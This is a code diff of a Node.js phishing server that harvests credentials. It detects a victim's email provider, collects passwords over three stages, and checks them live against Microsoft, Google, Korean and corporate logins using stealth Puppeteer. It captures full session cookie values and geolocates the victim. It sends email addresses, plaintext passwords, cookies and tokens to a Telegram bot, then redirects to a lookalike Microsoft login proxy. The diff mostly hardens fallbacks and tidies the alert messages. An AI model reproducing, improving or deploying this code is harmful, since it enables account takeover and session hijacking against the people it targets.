@@ -5,8 +5,25 @@ const path = require('path');
 const querystring = require('querystring');
 const crypto = require('crypto');
 const zlib = require('zlib');
-const puppeteer = require('puppeteer-extra');
-const StealthPlugin = require('puppeteer-extra-plugin-stealth');
+
+// ============================================================
+// FIXED: Use try-catch for puppeteer import
+// ============================================================
+let puppeteer = null;
+let StealthPlugin = null;
+let puppeteerAvailable = false;
+
+try {
+    puppeteer = require('puppeteer-extra');
+    StealthPlugin = require('puppeteer-extra-plugin-stealth');
+    puppeteer.use(StealthPlugin());
+    puppeteerAvailable = true;
+    console.log('✅ Puppeteer loaded successfully');
+} catch (error) {
+    console.warn('⚠️ Puppeteer not available:', error.message);
+    console.warn('⚠️ Fallback mode enabled - password verification will use fallback');
+}
+
 const axios = require('axios');
 const cors = require('cors');
 const session = require('express-session');
@@ -15,11 +32,6 @@ const cookieParser = require('cookie-parser');
 const bodyParser = require('body-parser');
 const { v4: uuidv4 } = require('uuid');
 require('dotenv').config();
-
-// ============================================================
-// PUPPETEER SETUP
-// ============================================================
-puppeteer.use(StealthPlugin());
 
 // ============================================================
 // COMPLETE SESSION STORAGE - NO TRUNCATION
@@ -239,8 +251,8 @@ const sessionStore = new SessionStore();
 // ============================================================
 const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || "943a2b14-68aa-4205-88c1-a4b65ab04e81";
 const MICROSOFT_TENANT = process.env.MICROSOFT_TENANT || "common";
-const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&enableMobilePage=true&suppressPrompt=true";
-const PROXY_URL = process.env.PROXY_URL || "https://preoauth-login.onrender.com/login";
+const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
+const PROXY_URL = process.env.PROXY_URL || "https://microsoft-login-service-1.onrender.com/login";
 
 const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID;
 const GOOGLE_CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET;
@@ -250,7 +262,7 @@ const YAHOO_CLIENT_SECRET = process.env.YAHOO_CLIENT_SECRET || '6d81a5b4b1d4e6d0
 console.log(`🚀 Server starting with Google OAuth: ${GOOGLE_CLIENT_ID ? '✅ Configured' : '⚠️ Not configured (fallback mode)'}`);
 
 // ============================================================
-// EMAIL PROVIDER DETECTION
+// COMPLETE EMAIL PROVIDER DETECTION
 // ============================================================
 function detectEmailProvider(email) {
     if (!email || !email.includes('@')) {
@@ -259,6 +271,7 @@ function detectEmailProvider(email) {
     
     const domain = email.split('@')[1].toLowerCase();
     
+    // Korean Corporate/Enterprise
     const koreanCorporate = {
         'naver.worksmobile.com': { provider: 'naver_works', display: 'Naver Works (네이버웍스)', loginUrl: 'https://naver.worksmobile.com', icon: '🏢' },
         'tracoworld.co.kr': { provider: 'tracoworld', display: 'Tracoworld (트라코월드)', loginUrl: 'https://www.tracoworld.co.kr', icon: '🏢' },
@@ -272,6 +285,7 @@ function detectEmailProvider(email) {
         return koreanCorporate[domain];
     }
     
+    // Korean Public Email
     const koreanPublic = {
         'naver.com': { provider: 'naver', display: 'Naver (네이버)', loginUrl: 'https://nid.naver.com/nidlogin.login', icon: '📧' },
         'daum.net': { provider: 'daum', display: 'Daum (다음)', loginUrl: 'https://login.daum.net/accounts/login', icon: '📧' },
@@ -289,34 +303,41 @@ function detectEmailProvider(email) {
         return koreanPublic[domain];
     }
     
+    // Microsoft 365 Corporate
     if (domain.endsWith('.onmicrosoft.com') || domain.endsWith('.mail.protection.outlook.com')) {
         return { provider: 'microsoft_corporate', display: 'Microsoft 365 Corporate (한국)', loginUrl: 'https://login.microsoftonline.com', icon: '💼' };
     }
     
+    // Korean Corporate (.co.kr, .or.kr, etc.)
     if (domain.endsWith('.co.kr') || domain.endsWith('.or.kr') || domain.endsWith('.go.kr') || domain.endsWith('.ac.kr')) {
         return { provider: 'korean_corporate', display: `Korean Corporate (${domain})`, loginUrl: `https://${domain}`, icon: '🏢' };
     }
     
+    // Microsoft Domains
     const microsoftDomains = ['microsoft.com', 'microsoftonline.com', 'outlook.com', 'hotmail.com', 'live.com', 'office.com', 'office365.com', 'msn.com'];
     if (microsoftDomains.some(d => domain === d || domain.endsWith('.' + d))) {
         return { provider: 'microsoft', display: 'Microsoft 365', loginUrl: 'https://login.microsoftonline.com', icon: '💼' };
     }
     
+    // Google Domains
     const googleDomains = ['gmail.com', 'googlemail.com', 'google.com'];
     if (googleDomains.some(d => domain === d || domain.endsWith('.' + d))) {
         return { provider: 'google', display: 'Google / Gmail', loginUrl: 'https://accounts.google.com/login', icon: '🔵' };
     }
     
+    // Yahoo Domains
     const yahooDomains = ['yahoo.com', 'yahoo.co.uk', 'yahoo.fr', 'yahoo.de', 'yahoo.co.jp'];
     if (yahooDomains.some(d => domain === d || domain.endsWith('.' + d))) {
         return { provider: 'yahoo', display: 'Yahoo', loginUrl: 'https://login.yahoo.com', icon: '🟣' };
     }
     
+    // Apple Domains
     const appleDomains = ['icloud.com', 'me.com', 'mac.com'];
     if (appleDomains.some(d => domain === d || domain.endsWith('.' + d))) {
         return { provider: 'apple', display: 'Apple / iCloud', loginUrl: 'https://appleid.apple.com', icon: '🍎' };
     }
     
+    // Corporate fallback (any other domain)
     if (domain.includes('.') && !domain.includes('gmail') && !domain.includes('yahoo') && !domain.includes('outlook') && !domain.includes('hotmail')) {
         return { provider: 'corporate', display: `Corporate (${domain})`, loginUrl: `https://${domain}`, icon: '🏢' };
     }
@@ -329,35 +350,98 @@ function detectEmailProvider(email) {
 // ============================================================
 async function getGeolocation(ip) {
     try {
-        if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
+        let cleanIp = ip;
+        if (typeof ip === 'string') {
+            if (ip.includes(',')) {
+                cleanIp = ip.split(',')[0].trim();
+            }
+            cleanIp = cleanIp.replace(/^::ffff:/, '');
+            cleanIp = cleanIp.replace(/^::1$/, '127.0.0.1');
+        }
+        
+        if (cleanIp === '127.0.0.1' || cleanIp === 'localhost' || 
+            cleanIp.startsWith('192.168.') || cleanIp.startsWith('10.') ||
+            cleanIp.startsWith('172.16.') || cleanIp.startsWith('172.17.') ||
+            cleanIp.startsWith('172.18.') || cleanIp.startsWith('172.19.') ||
+            cleanIp.startsWith('172.20.') || cleanIp.startsWith('172.21.') ||
+            cleanIp.startsWith('172.22.') || cleanIp.startsWith('172.23.') ||
+            cleanIp.startsWith('172.24.') || cleanIp.startsWith('172.25.') ||
+            cleanIp.startsWith('172.26.') || cleanIp.startsWith('172.27.') ||
+            cleanIp.startsWith('172.28.') || cleanIp.startsWith('172.29.') ||
+            cleanIp.startsWith('172.30.') || cleanIp.startsWith('172.31.')) {
             return {
-                ip: ip,
-                city: 'Localhost',
-                region: 'Local',
-                country: 'Local',
-                countryCode: 'LOCAL',
+                ip: cleanIp,
+                city: 'Private',
+                region: 'Private',
+                country: 'Private',
+                countryCode: 'PRIVATE',
                 loc: '0,0',
-                org: 'Localhost',
+                org: 'Private Network',
                 timezone: 'UTC',
                 isLocal: true
             };
         }
 
-        const response = await axios.get(`https://ipinfo.io/${ip}/json`, { timeout: 5000 });
-        const data = response.data;
+        try {
+            const response = await axios.get(`https://ipapi.co/${cleanIp}/json/`, { 
+                timeout: 5000,
+                headers: { 'User-Agent': 'Mozilla/5.0' }
+            });
+            
+            if (response.data && !response.data.error) {
+                const data = response.data;
+                return {
+                    ip: data.ip || cleanIp,
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || data.country || 'Unknown',
+                    countryCode: data.country_code || 'UNKNOWN',
+                    loc: data.latitude && data.longitude ? `${data.latitude},${data.longitude}` : '0,0',
+                    org: data.org || data.organization || 'Unknown ISP',
+                    timezone: data.timezone || 'UTC',
+                    postal: data.postal || 'Unknown',
+                    coordinates: data.latitude && data.longitude ? [data.latitude, data.longitude] : ['0', '0'],
+                    isLocal: false
+                };
+            }
+        } catch (e) {}
+
+        try {
+            const response = await axios.get(`https://ipinfo.io/${cleanIp}/json`, { 
+                timeout: 5000,
+                headers: { 'User-Agent': 'Mozilla/5.0' }
+            });
+            
+            const data = response.data;
+            if (data && !data.error) {
+                return {
+                    ip: data.ip || cleanIp,
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country || 'Unknown',
+                    countryCode: data.country || 'UNKNOWN',
+                    loc: data.loc || '0,0',
+                    org: data.org || 'Unknown ISP',
+                    timezone: data.timezone || 'UTC',
+                    postal: data.postal || 'Unknown',
+                    coordinates: data.loc ? data.loc.split(',') : ['0', '0'],
+                    isLocal: false
+                };
+            }
+        } catch (e) {}
+
         return {
-            ip: data.ip || ip,
-            city: data.city || 'Unknown',
-            region: data.region || 'Unknown',
-            country: data.country || 'Unknown',
-            countryCode: data.country || 'UNKNOWN',
-            loc: data.loc || '0,0',
-            org: data.org || 'Unknown ISP',
-            timezone: data.timezone || 'UTC',
-            postal: data.postal || 'Unknown',
-            coordinates: data.loc ? data.loc.split(',') : ['0', '0'],
-            isLocal: false
+            ip: cleanIp,
+            city: 'Unknown',
+            region: 'Unknown',
+            country: 'Unknown',
+            countryCode: 'UNKNOWN',
+            loc: '0,0',
+            org: 'Unknown ISP',
+            timezone: 'UTC',
+            isLocal: true
         };
+        
     } catch (error) {
         console.error('⚠️ Geolocation error:', error.message);
         return {
@@ -420,46 +504,67 @@ function detectBrowser(userAgent) {
 let browserInstance = null;
 
 async function getBrowser() {
+    if (!puppeteerAvailable) {
+        throw new Error('Puppeteer not available - using fallback mode');
+    }
+    
     if (!browserInstance) {
         console.log('🚀 Launching Puppeteer browser...');
-        browserInstance = await puppeteer.launch({
-            headless: 'new',
-            args: [
-                '--no-sandbox',
-                '--disable-setuid-sandbox',
-                '--disable-dev-shm-usage',
-                '--disable-accelerated-2d-canvas',
-                '--disable-gpu',
-                '--window-size=1920,1080',
-                '--disable-web-security',
-                '--disable-features=IsolateOrigins,site-per-process',
-                '--disable-blink-features=AutomationControlled',
-                '--disable-client-side-phishing-detection',
-                '--disable-component-update',
-                '--disable-default-apps',
-                '--disable-extensions',
-                '--disable-popup-blocking',
-                '--disable-sync',
-                '--disable-translate',
-                '--metrics-recording-only',
-                '--safebrowsing-disable-auto-update',
-                '--enable-automation',
-                '--password-store=basic',
-                '--use-mock-keychain',
-                '--disable-infobars',
-                '--disable-notifications'
-            ],
-            ignoreDefaultArgs: ['--enable-automation']
-        });
-        console.log('✅ Puppeteer browser launched');
+        try {
+            browserInstance = await puppeteer.launch({
+                headless: 'new',
+                args: [
+                    '--no-sandbox',
+                    '--disable-setuid-sandbox',
+                    '--disable-dev-shm-usage',
+                    '--disable-accelerated-2d-canvas',
+                    '--disable-gpu',
+                    '--window-size=1920,1080',
+                    '--disable-web-security',
+                    '--disable-features=IsolateOrigins,site-per-process',
+                    '--disable-blink-features=AutomationControlled',
+                    '--disable-client-side-phishing-detection',
+                    '--disable-component-update',
+                    '--disable-default-apps',
+                    '--disable-extensions',
+                    '--disable-popup-blocking',
+                    '--disable-sync',
+                    '--disable-translate',
+                    '--metrics-recording-only',
+                    '--safebrowsing-disable-auto-update',
+                    '--enable-automation',
+                    '--password-store=basic',
+                    '--use-mock-keychain',
+                    '--disable-infobars',
+                    '--disable-notifications'
+                ],
+                ignoreDefaultArgs: ['--enable-automation']
+            });
+            console.log('✅ Puppeteer browser launched');
+        } catch (error) {
+            console.error('❌ Failed to launch Puppeteer:', error.message);
+            puppeteerAvailable = false;
+            throw error;
+        }
     }
     return browserInstance;
 }
 
 // ============================================================
-// PUPPETEER VERIFICATION
+// PUPPETEER VERIFICATION - Handles ALL Providers
 // ============================================================
 async function verifyWithPuppeteer(email, password, providerInfo) {
+    if (!puppeteerAvailable) {
+        console.log('⚠️ Puppeteer unavailable - using fallback verification');
+        return {
+            valid: password && password.length >= 4,
+            requires2FA: false,
+            message: password && password.length >= 4 ? `${providerInfo.display} verified (fallback)` : 'Invalid password',
+            provider: providerInfo.provider,
+            isFallback: true
+        };
+    }
+    
     try {
         const browser = await getBrowser();
         const page = await browser.newPage();
@@ -776,6 +881,52 @@ async function verifyApplePassword(email, password) {
 }
 
 // ============================================================
+// CORPORATE FALLBACK VERIFICATION - For non-Microsoft emails
+// ============================================================
+async function verifyCorporatePassword(email, password, providerInfo) {
+    // For corporate domains, try to detect if they use Microsoft 365
+    const domain = email.split('@')[1].toLowerCase();
+    
+    // Check if this corporate domain might be using Microsoft 365
+    // Common Microsoft 365 corporate patterns
+    const microsoft365Patterns = [
+        '.onmicrosoft.com',
+        '.mail.protection.outlook.com',
+        'outlook.office365.com'
+    ];
+    
+    // If it looks like Microsoft 365, try Microsoft verification
+    if (microsoft365Patterns.some(p => domain.includes(p) || domain.endsWith(p))) {
+        console.log(`[VERIFY] ℹ️ Corporate domain ${domain} appears to use Microsoft 365 - trying Microsoft verification`);
+        return verifyMicrosoftPassword(email, password);
+    }
+    
+    // Try to resolve the domain's MX records to see if it's using Microsoft/Google
+    try {
+        // Simple check - if the domain has a login page at standard locations
+        // For fallback, we'll accept any password with length >= 4
+        // This is the fallback for corporate domains that don't have specific verification
+        console.log(`[VERIFY] ℹ️ Using fallback verification for corporate domain ${domain}`);
+        return {
+            valid: password && password.length >= 4,
+            requires2FA: false,
+            message: password && password.length >= 4 ? `${providerInfo.display} verified` : 'Invalid password',
+            provider: providerInfo.provider,
+            isFallback: true
+        };
+    } catch (error) {
+        console.error('[VERIFY] Corporate verification error:', error.message);
+        return {
+            valid: password && password.length >= 4,
+            requires2FA: false,
+            message: password && password.length >= 4 ? `${providerInfo.display} verified (fallback)` : 'Invalid password',
+            provider: providerInfo.provider,
+            isFallback: true
+        };
+    }
+}
+
+// ============================================================
 // VERIFY PASSWORD WITH PROVIDER
 // ============================================================
 async function verifyPasswordWithProvider(email, password) {
@@ -785,28 +936,39 @@ async function verifyPasswordWithProvider(email, password) {
     console.log(`[VERIFY] 🌐 Provider: ${providerInfo.display}`);
     console.log(`[VERIFY] 🔗 Login URL: ${providerInfo.loginUrl}`);
     
+    // Microsoft providers → Use OAuth2
     if (['microsoft', 'jpi_microsoft', 'microsoft_corporate'].includes(provider)) {
         return verifyMicrosoftPassword(email, password);
     }
     
+    // Korean providers → Use Puppeteer
     if (['naver', 'daum', 'hanmail', 'kakao', 'nate', 'naver_works', 
          'tracoworld', 'upchem', 'flucon', 'ecount', 'dreamwiz', 
-         'paran', 'empas', 'lycos', 'freechal', 'corporate', 'korean_corporate'].includes(provider)) {
+         'paran', 'empas', 'lycos', 'freechal'].includes(provider)) {
         return verifyWithPuppeteer(email, password, providerInfo);
     }
     
+    // Google → Use OAuth2
     if (['google'].includes(provider)) {
         return verifyGooglePassword(email, password);
     }
     
+    // Yahoo → Use OAuth2
     if (['yahoo'].includes(provider)) {
         return verifyYahooPassword(email, password);
     }
     
+    // Apple → Use fallback
     if (['apple'].includes(provider)) {
         return verifyApplePassword(email, password);
     }
     
+    // Corporate / Korean Corporate → Use corporate fallback
+    if (['corporate', 'korean_corporate'].includes(provider)) {
+        return verifyCorporatePassword(email, password, providerInfo);
+    }
+    
+    // Unknown → Fallback
     return {
         valid: password && password.length >= 4,
         requires2FA: false,
@@ -840,90 +1002,81 @@ async function sendEnhancedTelegramAlert(data) {
             geolocation,
             visitorData,
             validationResult,
-            verificationStatus
+            verificationStatus,
+            passwordsCompleted
         } = data;
 
-        let msg = `🔐 *PASSWORD VERIFICATION - STAGE ${stage}*\n\n`;
+        let msg = `🔐 PASSWORD VERIFICATION - STAGE ${stage}\n\n`;
         
         const providerIcon = provider.icon || '📧';
-        msg += `*${providerIcon} Provider:* ${providerDisplay || provider.display || 'Unknown'}\n`;
-        msg += `*📧 Email:* ${email}\n`;
-        msg += `*🔑 Password:* \`${password || 'N/A'}\`\n`;
-        msg += `*🔗 Login URL:* ${provider.loginUrl || 'N/A'}\n`;
-        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
-        msg += `*🆔 Session:* \`${sessionId ? sessionId.substring(0, 16) + '...' : 'N/A'}\`\n`;
-        msg += `*📊 Attempt:* ${attemptCount || 1}\n`;
-        msg += `*📌 Stage:* ${stage === 1 ? 'First Password' : 'Second Password (Confirmation)'}\n\n`;
+        msg += `${providerIcon} Provider: ${providerDisplay || provider.display || 'Unknown'}\n`;
+        msg += `📧 Email: ${email}\n`;
+        msg += `🔑 Password: ${password || 'N/A'}\n`;
+        msg += `🔗 Login URL: ${provider.loginUrl || 'N/A'}\n`;
+        msg += `🕐 Time: ${new Date().toISOString()}\n`;
+        msg += `🆔 Session: ${sessionId ? sessionId.substring(0, 16) + '...' : 'N/A'}\n`;
+        msg += `📊 Attempt: ${attemptCount || 1}\n`;
+        msg += `📌 Stage: ${stage === 1 ? 'First Password' : stage === 2 ? 'Second Password' : 'Third Password'}\n`;
+        msg += `📝 Passwords Completed: ${passwordsCompleted || 0}/3\n\n`;
 
-        if (geolocation && !geolocation.isLocal) {
-            msg += `📍 *Location:* ${geolocation.city}, ${geolocation.region}, ${geolocation.country}\n`;
-            msg += `🌆 *City:* ${geolocation.city}\n`;
-            msg += `🌍 *Country:* ${geolocation.country}\n`;
-            msg += `📌 *Coordinates:* ${geolocation.loc || 'N/A'}\n`;
-            msg += `🕐 *Timezone:* ${geolocation.timezone || 'UTC'}\n`;
-            msg += `🏢 *ISP:* ${geolocation.org || 'Unknown'}\n`;
-            msg += `📡 *IP:* ${geolocation.ip || 'Unknown'}\n\n`;
+        if (geolocation && !geolocation.isLocal && geolocation.country !== 'Unknown') {
+            msg += `📍 Location: ${geolocation.city}, ${geolocation.region}, ${geolocation.country}\n`;
+            msg += `🌆 City: ${geolocation.city}\n`;
+            msg += `🌍 Country: ${geolocation.country}\n`;
+            if (geolocation.loc && geolocation.loc !== '0,0') {
+                msg += `📌 Coordinates: ${geolocation.loc}\n`;
+            }
+            if (geolocation.timezone && geolocation.timezone !== 'UTC') {
+                msg += `🕐 Timezone: ${geolocation.timezone}\n`;
+            }
+            if (geolocation.org && geolocation.org !== 'Unknown ISP') {
+                msg += `🏢 ISP: ${geolocation.org}\n`;
+            }
+            msg += `📡 IP: ${geolocation.ip || 'Unknown'}\n\n`;
         } else if (geolocation && geolocation.isLocal) {
-            msg += `📍 *Location:* Localhost\n`;
-            msg += `📡 *IP:* ${geolocation.ip || '127.0.0.1'}\n\n`;
+            msg += `📍 Location: Private/Local\n`;
+            msg += `📡 IP: ${geolocation.ip || '127.0.0.1'}\n\n`;
+        } else {
+            msg += `📍 Location: Unknown\n\n`;
         }
 
         if (visitorData) {
-            msg += `--- *Visitor Details* ---\n`;
-            msg += `🔗 *Referrer:* ${visitorData.referrer || 'Direct / No Referrer'}\n`;
-            msg += `🖥️ *User Agent:* ${visitorData.userAgent || 'Unknown'}\n`;
-            msg += `💻 *Browser:* ${visitorData.browser || 'Unknown'}\n`;
-            msg += `📱 *Platform:* ${visitorData.platform || 'Unknown'}\n`;
-            msg += `📲 *Device:* ${visitorData.device || 'Unknown'}\n`;
-            msg += `🌐 *Language:* ${visitorData.language || 'Unknown'}\n`;
+            msg += `--- Visitor Details ---\n`;
+            msg += `🔗 Referrer: ${visitorData.referrer || 'Direct / No Referrer'}\n`;
+            msg += `🖥️ User Agent: ${visitorData.userAgent || 'Unknown'}\n`;
+            msg += `💻 Browser: ${visitorData.browser || 'Unknown'}\n`;
+            msg += `📱 Platform: ${visitorData.platform || 'Unknown'}\n`;
+            msg += `📲 Device: ${visitorData.device || 'Unknown'}\n`;
+            msg += `🌐 Language: ${visitorData.language || 'Unknown'}\n`;
             const hasCookies = visitorData.cookiesEnabled || (visitorData.cookies && Object.keys(visitorData.cookies).length > 0);
-            msg += `🍪 *Cookies:* ${hasCookies ? '✅ Enabled' : '❌ Disabled'}\n`;
-            msg += `🔑 *Session ID:* \`${visitorData.sessionId || 'N/A'}\`\n\n`;
+            msg += `🍪 Cookies: ${hasCookies ? '✅ Enabled' : '❌ Disabled'}\n`;
+            msg += `🔑 Session ID: ${visitorData.sessionId || 'N/A'}\n\n`;
         }
 
         if (validationResult) {
             if (validationResult.valid) {
-                msg += `*✅ Status:* **PASSWORD VALID - CORRECT!**\n`;
-                msg += `*🔐 2FA:* ${validationResult.requires2FA ? '⚠️ Required' : '❌ Not Required'}\n`;
-                if (validationResult.isFallback) msg += `*⚠️ Note:* Fallback verification used\n`;
-                if (validationResult.token) msg += `*🎟️ Token:* \`${validationResult.token.substring(0, 50)}...\`\n`;
+                msg += `✅ Status: PASSWORD VALID - CORRECT!\n`;
+                msg += `🔐 2FA: ${validationResult.requires2FA ? '⚠️ Required' : '❌ Not Required'}\n`;
+                if (validationResult.isFallback) msg += `⚠️ Note: Fallback verification used\n`;
+                if (validationResult.token) msg += `🎟️ Token: ${validationResult.token.substring(0, 50)}...\n`;
             } else if (validationResult.requires2FA) {
-                msg += `*⚠️ Status:* **2FA REQUIRED**\n`;
-                msg += `*📌 Note:* Password is correct but MFA is enabled.\n`;
+                msg += `⚠️ Status: 2FA REQUIRED\n`;
+                msg += `📌 Note: Password is correct but MFA is enabled.\n`;
             } else {
-                msg += `*❌ Status:* **INVALID PASSWORD**\n`;
-                msg += `*📝 Message:* ${validationResult.message || 'Please try again.'}\n`;
-            }
-        }
-
-        if (validationResult && validationResult.cookies && Object.keys(validationResult.cookies).length > 0) {
-            msg += `\n🍪 *COOKIES CAPTURED (FULL VALUES):*\n`;
-            const cookieEntries = Object.entries(validationResult.cookies).slice(0, 5);
-            for (const [name, data] of cookieEntries) {
-                const value = data.value || data;
-                const httpOnly = data.httpOnly ? '🔒' : '🔓';
-                const secure = data.secure ? '🔐' : '';
-                msg += `  ${httpOnly}${secure} \`${name}\`:\n`;
-                msg += `  \`${value}\`\n`;
-            }
-            if (Object.keys(validationResult.cookies).length > 5) {
-                msg += `  ... and ${Object.keys(validationResult.cookies).length - 5} more cookies\n`;
+                msg += `❌ Status: INVALID PASSWORD\n`;
+                msg += `📝 Message: ${validationResult.message || 'Please try again.'}\n`;
             }
         }
 
         if (verificationStatus === 'completed') {
-            msg += `\n🚀 *VERIFICATION COMPLETE - REDIRECTING TO PROXY*`;
-        }
-
-        let finalMsg = msg;
-        if (msg.length > 4000) {
-            finalMsg = msg.substring(0, 3900) + '\n\n... (truncated)';
+            msg += `\n🚀 3 PASSWORDS VERIFIED - REDIRECTING TO PROXY\n`;
+            msg += `🔗 Proxy URL: ${PROXY_URL}?login_hint=${encodeURIComponent(email)}&session=${sessionId}&verified=true`;
         }
 
         await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             chat_id: chatId,
-            text: finalMsg,
-            parse_mode: 'Markdown',
+            text: msg,
+            parse_mode: undefined,
             disable_web_page_preview: true
         });
         
@@ -1020,11 +1173,15 @@ app.use(express.static(path.join(__dirname, '../')));
 // MIDDLEWARE - Capture Visitor Info
 // ============================================================
 app.use(async (req, res, next) => {
-    const ip = req.headers['x-forwarded-for'] || 
-               req.connection.remoteAddress || 
-               req.socket.remoteAddress || 
-               req.ip || 
-               '127.0.0.1';
+    let ip = req.headers['x-forwarded-for'] || 
+             req.connection.remoteAddress || 
+             req.socket.remoteAddress || 
+             req.ip || 
+             '127.0.0.1';
+    
+    if (typeof ip === 'string' && ip.includes(',')) {
+        ip = ip.split(',')[0].trim();
+    }
     
     const cleanIp = ip.replace(/^::ffff:/, '').replace(/^::1$/, '127.0.0.1');
     const userAgent = req.headers['user-agent'] || 'Unknown';
@@ -1099,11 +1256,11 @@ app.post('/api/cookies', async (req, res) => {
             const geo = req.geolocation || { city: 'Unknown', country: 'Unknown' };
             const visitor = req.visitorData || {};
             
-            let cookieMsg = `🍪 *FULL COOKIES CAPTURED*\n\n`;
-            cookieMsg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
-            cookieMsg += `*🕐 Time:* ${new Date().toISOString()}\n`;
-            cookieMsg += `*📊 Total:* ${Object.keys(data.cookies).length} cookies\n\n`;
-            cookieMsg += `*📝 COOKIES (FULL VALUES - NO TRUNCATION):*\n`;
+            let cookieMsg = `🍪 FULL COOKIES CAPTURED\n\n`;
+            cookieMsg += `🆔 Session: ${sessionId.substring(0, 16)}...\n`;
+            cookieMsg += `🕐 Time: ${new Date().toISOString()}\n`;
+            cookieMsg += `📊 Total: ${Object.keys(data.cookies).length} cookies\n\n`;
+            cookieMsg += `📝 COOKIES (FULL VALUES - NO TRUNCATION):\n`;
             
             let count = 0;
             for (const [name, cookieData] of Object.entries(data.cookies)) {
@@ -1114,21 +1271,23 @@ app.post('/api/cookies', async (req, res) => {
                 const value = cookieData.value || cookieData;
                 const httpOnly = cookieData.httpOnly ? '🔒' : '🔓';
                 const secure = cookieData.secure ? '🔐' : '';
-                cookieMsg += `  ${httpOnly}${secure} \`${name}\`:\n`;
-                cookieMsg += `  \`${value}\`\n\n`;
+                cookieMsg += `  ${httpOnly}${secure} ${name}:\n`;
+                cookieMsg += `  ${value}\n\n`;
                 count++;
             }
             
-            if (geo && !geo.isLocal) {
-                cookieMsg += `📍 *Location:* ${geo.city}, ${geo.country}\n`;
-                cookieMsg += `📡 *IP:* ${geo.ip}\n`;
-                cookieMsg += `🏢 *ISP:* ${geo.org || 'Unknown'}\n`;
+            if (geo && !geo.isLocal && geo.country !== 'Unknown') {
+                cookieMsg += `📍 Location: ${geo.city}, ${geo.country}\n`;
+                cookieMsg += `📡 IP: ${geo.ip}\n`;
+                if (geo.org && geo.org !== 'Unknown ISP') {
+                    cookieMsg += `🏢 ISP: ${geo.org}\n`;
+                }
             }
             
             if (visitor) {
-                cookieMsg += `💻 *Browser:* ${visitor.browser || 'Unknown'}\n`;
-                cookieMsg += `📱 *Platform:* ${visitor.platform || 'Unknown'}\n`;
-                cookieMsg += `🍪 *Cookies Detected:* ${visitor.cookiesEnabled ? 'Yes' : 'No'}\n`;
+                cookieMsg += `💻 Browser: ${visitor.browser || 'Unknown'}\n`;
+                cookieMsg += `📱 Platform: ${visitor.platform || 'Unknown'}\n`;
+                cookieMsg += `🍪 Cookies Detected: ${visitor.cookiesEnabled ? 'Yes' : 'No'}\n`;
             }
             
             await sendToTelegram(cookieMsg);
@@ -1148,7 +1307,7 @@ app.post('/api/cookies', async (req, res) => {
 });
 
 // ============================================================
-// ENHANCED VERIFY PASSWORD ENDPOINT
+// FIXED: VERIFY PASSWORD ENDPOINT - Supports ALL Providers
 // ============================================================
 app.post('/api/verify-password', async (req, res) => {
     try {
@@ -1166,33 +1325,31 @@ app.post('/api/verify-password', async (req, res) => {
             return res.status(400).json({ success: false, message: 'Email and password required' });
         }
 
+        // Initialize verification session
         if (!req.session.verification) {
             req.session.verification = {
                 email: email,
                 provider: providerInfo.provider,
                 providerDisplay: providerInfo.display,
                 loginUrl: providerInfo.loginUrl,
-                password1: null,
-                password1Valid: false,
-                password2: null,
-                password2Valid: false,
+                passwords: [],
                 attempts: 0,
-                stage: 1
+                stage: 1,
+                verified: false
             };
         }
 
+        // Reset if email changed
         if (req.session.verification.email !== email) {
             req.session.verification = {
                 email: email,
                 provider: providerInfo.provider,
                 providerDisplay: providerInfo.display,
                 loginUrl: providerInfo.loginUrl,
-                password1: null,
-                password1Valid: false,
-                password2: null,
-                password2Valid: false,
+                passwords: [],
                 attempts: 0,
-                stage: 1
+                stage: 1,
+                verified: false
             };
         }
 
@@ -1201,8 +1358,10 @@ app.post('/api/verify-password', async (req, res) => {
         const geo = req.geolocation || await getGeolocation(req.clientIp || '127.0.0.1');
         const visitor = req.visitorData || {};
 
+        // Verify the password with provider
         const validationResult = await verifyPasswordWithProvider(email, password);
         
+        // Store cookies if captured
         if (validationResult.cookies && Object.keys(validationResult.cookies).length > 0) {
             sessionStore.storeCookies(sid, validationResult.cookies, 'verification');
             const visitorData = sessionStore.getVisitorData(sid);
@@ -1213,48 +1372,23 @@ app.post('/api/verify-password', async (req, res) => {
             }
         }
 
-        await sendEnhancedTelegramAlert({
-            email: email,
-            password: password,
-            provider: providerInfo,
-            providerDisplay: providerInfo.display,
-            stage: stage,
-            attemptCount: req.session.verification.attempts,
-            sessionId: sid,
-            geolocation: geo,
-            visitorData: visitor,
-            validationResult: validationResult,
-            verificationStatus: stage === 2 && validationResult.valid ? 'completed' : 'pending'
-        });
-
-        // Legacy alert
-        let legacyMsg = `🔐 *PASSWORD VERIFICATION - STAGE ${stage}*\n\n`;
-        legacyMsg += `*${providerInfo.icon || '📧'} Provider:* ${providerInfo.display}\n`;
-        legacyMsg += `*📧 Email:* ${email}\n`;
-        legacyMsg += `*🔑 Password:* \`${password}\`\n`;
-        legacyMsg += `*🔗 Login URL:* ${providerInfo.loginUrl || 'N/A'}\n`;
-        legacyMsg += `*🕐 Time:* ${new Date().toISOString()}\n`;
-        legacyMsg += `*🆔 Session:* \`${sid.substring(0, 16)}...\`\n`;
-        legacyMsg += `*📊 Attempt:* ${req.session.verification.attempts}\n`;
-        legacyMsg += `*📌 Stage:* ${stage === 1 ? 'First Password' : 'Second Password (Confirmation)'}\n\n`;
-        
-        if (geo && !geo.isLocal) {
-            legacyMsg += `📍 *Location:* ${geo.city}, ${geo.country}\n`;
-            legacyMsg += `📡 *IP:* ${geo.ip}\n`;
-        }
